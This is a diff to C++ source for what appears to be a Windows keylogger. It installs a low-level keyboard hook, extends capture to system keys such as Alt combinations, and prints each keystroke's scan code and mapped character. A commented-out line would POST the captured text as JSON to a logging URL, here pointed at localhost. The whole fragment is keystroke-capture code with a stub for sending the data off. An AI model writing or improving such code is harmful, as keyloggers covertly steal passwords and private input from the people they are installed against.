@@ -10,9 +10,12 @@ const char* DEBUG_URL = "http://127.0.0.1:8000/log";
 LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
     auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
-    if (wParam == WM_KEYDOWN) {
+    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
-        printf("%d / %s\n",kbStruct->scanCode, scanCodeMapFI.find(kbStruct->scanCode)->second.c_str());
+
+        if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
+            printf("%d / %s\n",kbStruct->scanCode, scanCodeMapFI[kbStruct->scanCode].c_str());
+        }
 
         //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
        // cpr::Body{"{\"text\": \"" + body + "\"}"});
